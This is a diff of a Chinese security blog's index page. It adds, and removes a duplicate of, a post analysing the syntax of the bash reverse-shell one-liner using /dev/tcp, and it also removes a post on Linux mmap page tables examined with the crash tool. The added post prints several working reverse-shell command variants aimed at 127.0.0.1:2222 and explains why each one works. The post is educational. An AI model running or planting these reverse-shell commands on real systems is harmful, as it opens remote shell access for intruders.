   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
+<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
+<li><p>-i 参数</p>
+<p>  生成交互式shell</p>
+</li>
+<li><p><code>&gt;&amp;</code> 是什么？</p>
+<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
+<ul>
+<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
+</li>
+<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
+<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
+<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
+</li>
+</ul>
+</li>
+<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
+<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
+<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
+<p>  更详细的可以看参考资料</p>
+</li>
+<li><p><code>0&gt;&amp;1</code> 是什么？</p>
+<p>  将标准输入重定向到标准输出</p>
+</li>
+<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
+<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
+<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
+</li>
+</ul>
+<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
+<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
+<li><p>验证<code>&gt;&amp;</code>语法</p>
+<p> <code>&amp;&gt;</code>是一种特殊情况</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
+<li><p>验证 文件描述符指向 socket</p>
+<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
+
+<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
+<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
+<p> 比如下面命令反弹shell会有些问题</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p> 而下面命令可以反弹shell</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
+<ul>
+<li>“&gt;&amp;”的两种用法</li>
+<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%8F%8D%E6%B7%B7%E6%B7%86%22%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96%22/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -807,105 +1018,6 @@
 </ul>
 <p>测试结果在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/PlayWithObfuscator/tree/main/tests">tests目录</a> 看到</p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/a314131070/article/details/106567825?spm=1001.2014.3001.5501">JS反混淆-控制流平展（一）</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%80%9F%E5%8A%A9crash%E5%B7%A5%E5%85%B7%E7%90%86%E8%A7%A3linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/" class="post-title-link" itemprop="url">借助crash工具理解linux系统的内存分配</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qxbp6PGpCqzFDSToIWn05Q">Linux下访问匿名页发生的神奇“化学反应”</a>，我看完这篇文章感觉对linux的内存分配又多了一点点理解，因此也想推荐给你读下。</p>
-<p>原文提出了一个问题：向<code>mmap</code>系统调用申请的内存”读时”没有导致物理可用内存减少，但是”随后写时”发现物理可用内存减少。</p>
-<p>原作者借助”分析内核源码”的收到来剖析问题原因，最终得到结论：第一次读匿名页后，然后写匿名页，先只读方式映射到0页，然后发生写时复制，分配物理页，虚拟页以可读可写的方式映射到此物理页。</p>
-<p>我自己总结一下，就是按照时间顺序来看，当对”可读可写的vma”先读后写时，”对应的页表项”应该是：</p>
-<ul>
-<li>在第一次读之前不存在</li>
-<li>在第一次读之后，第一次写之前，映射到固定位置，此时页表属性是只读</li>
-<li>在第一次写之后，映射到实际分配的物理内存，此时页表属性是可读可写</li>
-</ul>
-<p>可能这个结论你听着还是有点绕，并且我想你可能和我一样，也不想一下子就去研究”内核源码”来理解到底是怎么回事。</p>
-<p>那怎么能搞清楚原文的问题和结论呢？我发现一个神器<code>crash</code>，实际操作一番后，我感觉文章结论其实很好理解。下面就和我一起玩一玩<code>crash</code>，理解<code>mmap</code>分配的内存到底是怎么回事，也验证一下原文的结论是否正确。</p>
-<p>crash是一个可以用来调试linux内核崩溃的工具，也可以调试正在运行中的内核。它的安装和使用都很简单，理解本篇文章也不需要你之前接触过这个工具。</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><ul>
-<li><p>准备源码</p>
-<p>我们在”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻分别调用<code>getchar()</code>停顿一下，方便我们用<code>crash</code>工具观察”页表项”</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp tmp]# cat e.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  char* addr &#x3D; mmap (NULL, 1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS , - 1 , 0);</span><br><span class="line"></span><br><span class="line">  printf (&quot;addr: %lu pid:%d\n&quot;, addr, getpid()); &#x2F;&#x2F; 在读内存之前：页表项不存在</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  printf (&quot;1:%s \n&quot;, addr);	&#x2F;&#x2F; 在读内存之后：映射了页表,页表项属性为&quot;只读&quot;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  strcpy(addr, &quot;AAAABBBB&quot;);	&#x2F;&#x2F; 在写内存之后：页表项属性为&quot;可读可写&quot;</span><br><span class="line"></span><br><span class="line">  printf (&quot;2:%s \n&quot;, addr);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面的c程序编译运行后，我们就可以来分析”读内存之前”、”读内存后写内存前”、”写内存之后”这三个时刻的”页表项”是什么了。</p>
-</li>
-<li><p>使用<code>crash</code>分析”页表项”的变化</p>
-<p>首先简单说一下crash的安装和使用。</p>
-<p>如果你是centos系统，就可以用以下命令来安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install crash  &#x2F;&#x2F; 安装crash工具</span><br><span class="line">debuginfo-install kernel-debuginfo-&#96;uname -r&#96;  &#x2F;&#x2F; 安装crash工具需要的内核文件</span><br></pre></td></tr></table></figure>
-
-<p>安装好后，使用下面的命令就可以调试”运行中的内核了”。vmlinux是带调试符号的内核文件。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# crash &#x2F;usr&#x2F;lib&#x2F;debug&#x2F;usr&#x2F;lib&#x2F;modules&#x2F;3.10.0-1160.11.1.el7.x86_64&#x2F;vmlinux &#x2F;dev&#x2F;mem</span><br></pre></td></tr></table></figure>
-
-<p>下面来看一下”页表项”的变化：我在程序三次<code>getchar()</code>时，使用<code>crash</code>的<code>vtop</code>命令查看”虚拟地址”对应的页表</p>
-<p><img src="https://user-images.githubusercontent.com/1846319/146151529-65a92898-2a18-48a5-958f-5076d5d94442.png" alt="image"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">crash&gt; set 31880    &#x2F;&#x2F; 31880是进程号</span><br><span class="line">    PID: 31880</span><br><span class="line">COMMAND: &quot;a.out&quot;</span><br><span class="line">   TASK: ffff9396f6a7a100  [THREAD_INFO: ffff93983cbe4000]</span><br><span class="line">    CPU: 1</span><br><span class="line">  STATE: TASK_INTERRUPTIBLE</span><br><span class="line">crash&gt; px 139812061335552  &#x2F;&#x2F; 十进制转成十六进制。139812061335552是mmap的返回值</span><br><span class="line">$1 &#x3D; 0x7f2888405000</span><br><span class="line">crash&gt; vtop 0x7f2888405000  &#x2F;&#x2F; vtop指令用来查看&quot;虚拟地址&quot;对应的&quot;物理地址&quot;</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  (not mapped)  &#x2F;&#x2F; 这里可以看出来，此时没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">   PGD: 16abd67f0 &#x3D;&gt; 16b7d7067</span><br><span class="line">   PUD: 16b7d7510 &#x3D;&gt; 170f95067</span><br><span class="line">   PMD: 170f95210 &#x3D;&gt; 160fd5067</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 0      &#x2F;&#x2F; &quot;页表项&quot;为0，其中的P标志位为0，表示&quot;页表项&quot;不存在，没有映射到对应的&quot;物理地址&quot;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">VIRTUAL     PHYSICAL</span><br><span class="line">7f2888405000  117d65000</span><br><span class="line">....</span><br><span class="line">   PTE: 160fd5028 &#x3D;&gt; 8000000117d65225</span><br><span class="line">  PAGE: 117d65000</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">8000000117d65225  117d65000  (PRESENT|USER|ACCESSED|NX)   &#x2F;&#x2F; 此时&quot;页表项&quot;有了映射关系，说明此时只能读不能写</span><br><span class="line"></span><br><span class="line">crash&gt; vtop 0x7f2888405000</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">      PTE         PHYSICAL   FLAGS</span><br><span class="line">80000003b0cf5867  3b0cf5000  (PRESENT|RW|USER|ACCESSED|DIRTY|NX)    &#x2F;&#x2F; RW标志表明此时可以写</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<p>如上面指令结果中的注释：执行三次vtop指令时，页表项(PTE)中的”FLAGS”都不断变化，读写权限确实像”问题背景”中那样变化。可以看出来，结论是没有问题的</p>
-<p>怎么样，crash验证这个结论是不是很简单？</p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>crash很好用，如果你想了解更多crash工具的应用场景，可以参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw">解决Linux内核问题实用技巧之 - Crash工具结合/dev/mem任意修改内存</a></p>
 
       
     </div>
@@ -1163,126 +1275,6 @@
 <p>但是如果直接<code>cat /proc/&#123;pid&#125;/exe</code>，就会发现仍然可以读到源二进制程序内容。</p>
 <p>那怎么让<code>/proc/&#123;pid&#125;/exe</code>也无法还原出二进制程序呢，这个问题留给读者思考。</p>
 <p>本文提到的手段没有在真实的对抗中实践过，仅仅是我自己的研究，欢迎与我交流。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E5%88%86%E6%9E%90bash%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E8%AF%AD%E6%B3%95/" class="post-title-link" itemprop="url">分析bash反弹shell的语法</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>对下面的反弹shell语法细节有些模糊，故分析一下。</p>
-<p>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>-i 参数</p>
-<p>  生成交互式shell</p>
-</li>
-<li><p><code>&gt;&amp;</code> 是什么？</p>
-<p>  bash中<code>&gt;&amp;</code>语法比较特殊，有两种解释：</p>
-<ul>
-<li><p>后面接数字时，如<code>&gt;&amp;1</code>表示复制文件描述符</p>
-</li>
-<li><p>后面接非数字时，如<code>&gt;&amp;xxx</code>表示标准输入和标准输出重定向</p>
-<p>可以查看<code>man bash</code>手册，有详细介绍。</p>
-<p>在这个反弹shell中，第一个<code>&gt;&amp;</code>含义是 把标准输入和标准输出重定向到socket</p>
-</li>
-</ul>
-</li>
-<li><p><code>/dev/tcp/127.0.0.1/2222</code> 是什么？</p>
-<p>  它不是文件，只是bash解释器会对/dev/tcp对特殊处理，代表了一个tcp socket。</p>
-<p>  所以如果其他的sh解释器，如zsh、ksh等没有这个特殊解释时，就不能用这个来打开socket。</p>
-<p>  更详细的可以看参考资料</p>
-</li>
-<li><p><code>0&gt;&amp;1</code> 是什么？</p>
-<p>  将标准输入重定向到标准输出</p>
-</li>
-<li><p>“&gt;&amp; /dev/tcp/127.0.0.1/2222”  为什么不是 “&gt; /dev/tcp/127.0.0.1/2222”？</p>
-<p>  bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</p>
-<p>  其实是可以的，不过这样标准错误就没有重定向到socket。可以通过查看 /proc/{pid}/fd/ 验证</p>
-</li>
-</ul>
-<p>根据上面的了解，可以推导出 这个反弹shell会将自己的标准输入、标准输出、标准错误全部重定向到同一个socket。</p>
-<h1 id="动手实验"><a href="#动手实验" class="headerlink" title="动手实验"></a>动手实验</h1><ol>
-<li><p>验证<code>&gt;&amp;</code>语法</p>
-<p> <code>&amp;&gt;</code>是一种特殊情况</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;111   因为 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;复制文件描述符&quot;来执行。执行命令时因为不存在111文件描述符，所以报错</span><br><span class="line">ls &#x2F;tmp&#x2F; &gt;&amp;xxx   因为不是 &quot;&gt;&amp;数字&quot;，所以会被bash解释成&quot;重定向标准输出和标准错误&quot;来执行</span><br><span class="line"></span><br><span class="line">执行结果，只有xxx文件，没有111文件</span><br><span class="line">[root@instance-fj5pftdp t]# ls</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure></li>
-<li><p>验证 文件描述符指向 socket</p>
-<p> 执行<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>后的文件描述符指向了同一个socket</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@instance-fj5pftdp ~]# ls -al &#x2F;proc&#x2F;4961&#x2F;fd&#x2F;</span><br><span class="line">总用量 0</span><br><span class="line">dr-x------ 2 root root  0 2月  19 11:26 .</span><br><span class="line">dr-xr-xr-x 9 root root  0 2月  19 11:26 ..</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 0 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:27 1 -&gt; socket:[201270351]</span><br><span class="line">lrwx------ 1 root root 64 2月  19 11:26 2 -&gt; socket:[201270351]</span><br></pre></td></tr></table></figure>
-
-<p> 如果执行<code>bash -i &gt; /dev/tcp/127.0.0.1/2222 0&gt;&amp;1</code>，标准错误描述符就不会指向socket</p>
-<p> 另外命令中需要注意到空格，”[n]&gt;&amp;word”可以写成”[n]&gt;&amp; word”，不可以写成”[n] &gt;&amp;word”</p>
-<p> 比如下面命令反弹shell会有些问题</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1 &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0 &gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p> 而下面命令可以反弹shell</p>
- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i 1&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;1</span><br><span class="line">bash -i 1&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp; 1</span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;2222 0&gt;&amp;2</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
-<ul>
-<li>“&gt;&amp;”的两种用法</li>
-<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
-</ul>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
-</ul>
 
       
     </div>
